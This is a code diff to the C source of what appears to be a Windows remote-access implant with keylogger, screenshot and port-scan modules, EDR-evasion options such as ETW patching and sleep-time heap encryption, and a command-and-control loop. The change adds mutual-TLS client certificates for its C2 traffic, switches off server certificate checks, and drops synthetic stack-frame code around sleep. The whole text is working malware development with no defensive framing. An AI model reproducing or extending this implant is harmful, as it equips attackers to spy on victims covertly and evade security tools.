@@ -26,6 +26,9 @@
 #ifndef USE_HTTPS
 #define USE_HTTPS 0
 #endif
+#ifndef USE_MTLS
+#define USE_MTLS 0
+#endif
 
 /* ── Evasion options (toggled by builder via -D flags) ─── */
 #ifndef ENABLE_ETW_PATCH
@@ -75,6 +78,27 @@
 #include "keylogger.h"
 #include "screenshot.h"
 #include "portscan.h"
+
+#if USE_MTLS
+#include <wincrypt.h>
+#include "include/mtls_cert.h"
+#pragma comment(lib, "crypt32.lib")
+static PCCERT_CONTEXT g_mtls_cert_ctx = NULL;
+
+static void init_mtls_cert(void) {
+    CRYPT_DATA_BLOB pfxBlob;
+    pfxBlob.cbData = g_mtls_pfx_len;
+    pfxBlob.pbData = (BYTE*)g_mtls_pfx;
+    HCERTSTORE hStore = PFXImportCertStore(&pfxBlob, L"", CRYPT_EXPORTABLE);
+    if (!hStore)
+        hStore = PFXImportCertStore(&pfxBlob, NULL, CRYPT_EXPORTABLE);
+    if (hStore) {
+        g_mtls_cert_ctx = CertFindCertificateInStore(
+            hStore, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
+            0, CERT_FIND_ANY, NULL, NULL);
+    }
+}
+#endif
 
 /* ── Runtime-configurable sleep (server can change via 'sleep' command) */
 static int  g_sleep_ms   = 5000;
@@ -294,6 +318,20 @@ static int http_post(const char *host, int port, int use_https, const char *path
         snprintf(hdr_narrow, sizeof(hdr_narrow), "Content-Type: application/json\r\n");
     }
     WCHAR hdr_wide[640]; ascii_to_wide(hdr_narrow, hdr_wide, 640);
+
+    if (use_https) {
+        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
+#if USE_MTLS
+        if (g_mtls_cert_ctx) {
+            WinHttpSetOption(hReq, WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
+                             (LPVOID)g_mtls_cert_ctx, sizeof(CERT_CONTEXT));
+        }
+#endif
+    }
 
     if (!WinHttpSendRequest(hReq, hdr_wide, (DWORD)-1L, (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0)) {
         WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return -1;
@@ -679,6 +717,10 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
     g_c2_port  = C2_PORT;
     g_c2_https = USE_HTTPS;
 
+#if USE_MTLS
+    init_mtls_cert();
+#endif
+
     /* Register all sensitive globals for heap XOR during sleep.
        Session key is registered after it is derived from ECDH. */
     heap_register_region(g_agent_id,    sizeof(g_agent_id));
@@ -941,9 +983,6 @@ do_sleep:
             }
             if (s < 500) s = 500;
 
-#if ENABLE_SYNTHETIC_FRAMES
-            synth_frames_push();
-#endif
 #if ENABLE_SLEEP_ENCRYPT
             if (g_agent_id[0]) {
                 heap_key_init();
@@ -953,9 +992,6 @@ do_sleep:
             }
 #else
             Sleep((DWORD)s);
-#endif
-#if ENABLE_SYNTHETIC_FRAMES
-            synth_frames_pop();
 #endif
         }
     }
